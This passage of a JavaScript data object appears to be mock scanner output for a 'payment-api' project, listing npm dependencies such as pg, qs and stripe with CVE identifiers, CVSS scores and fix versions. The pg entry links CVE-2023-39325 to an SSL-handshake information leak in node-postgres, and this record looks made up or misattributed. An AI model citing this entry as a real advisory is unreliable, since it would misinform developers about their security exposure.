      exploitAvailable: true,
      license: 'MIT',
      usageFile: 'package.json',
      description: 'Promise based HTTP client for browser and node.js'
    },
    {
      id: 'dep-pg',
      name: 'pg',
      version: '7.12.0',
      resolvedVersion: '7.12.0',
      latestVersion: '8.13.1',
      ecosystem: 'npm',
      isDirect: true,
      isTransitive: false,
      dependencyPath: ['payment-api', 'pg'],
      riskLevel: 'medium',
      vulnerabilities: [
        {
          id: 'GHSA-4h88-5g96-cp77',
          aliases: ['CVE-2023-39325', 'GHSA-4h88-5g96-cp77'],
          summary: 'Potential Information Disclosure in SSL Handshake Error Handling',
          details: 'The pg client in node-postgres could leak memory fragments in SSL connection errors under specific misconfigured certificate environments.',
          fixedIn: '8.13.1',
          cvssScore: 6.1,
          severity: 'medium',
          exploitAvailable: false,
          published: '2023-10-10',
          references: ['https://nvd.nist.gov/vuln/detail/CVE-2023-39325']
        }
      ],
      vulnerability: 'CVE-2023-39325: Information Disclosure in SSL Handshake Error Handling',
      cve: 'CVE-2023-39325',
      ghsa: 'GHSA-4h88-5g96-cp77',
      fixedIn: '8.13.1',
      exploitAvailable: false,
      license: 'MIT',
      usageFile: 'package.json',
      description: 'Non-blocking PostgreSQL client for Node.js'
    },
    {
      id: 'dep-qs',
      name: 'qs',
      version: '6.5.2',
      resolvedVersion: '6.5.2',
      latestVersion: '6.13.0',
      ecosystem: 'npm',
      isDirect: false,
      isTransitive: true,
      dependencyPath: ['payment-api', 'express', 'qs'],
      riskLevel: 'high',
      vulnerabilities: [
        {
          id: 'GHSA-hrpp-h998-j3pp',
          aliases: ['CVE-2022-24999', 'GHSA-hrpp-h998-j3pp'],
          summary: 'Prototype Pollution in qs query string parsing function',
          details: 'qs prior to 6.5.3 allows unvalidated parameter bracket parsing to pollute Object prototype via __proto__ properties.',
          fixedIn: '6.5.3',
          cvssScore: 7.5,
          severity: 'high',
          exploitAvailable: true,
          published: '2022-12-05',
          references: ['https://nvd.nist.gov/vuln/detail/CVE-2022-24999']
        }
      ],
      vulnerability: 'CVE-2022-24999: Prototype Pollution in qs query parser',
      cve: 'CVE-2022-24999',
      ghsa: 'GHSA-hrpp-h998-j3pp',
      fixedIn: '6.5.3',
      exploitAvailable: true,
      license: 'BSD-3-Clause',
      usageFile: 'package-lock.json',
      description: 'A querystring parser that supports nesting and arrays (transitive via express)'
    },
    {
      id: 'dep-stripe',
      name: 'stripe',
      version: '8.2.0',
      resolvedVersion: '8.2.0',
      latestVersion: '17.5.0',
      ecosystem: 'npm',
      isDirect: true,
      isTransitive: false,
      dependencyPath: ['payment-api', 'stripe'],
      riskLevel: 'safe',
      license: 'MIT',
      usageFile: 'package.json',
      description: 'Stripe API node.js library'
    }
  ]
};
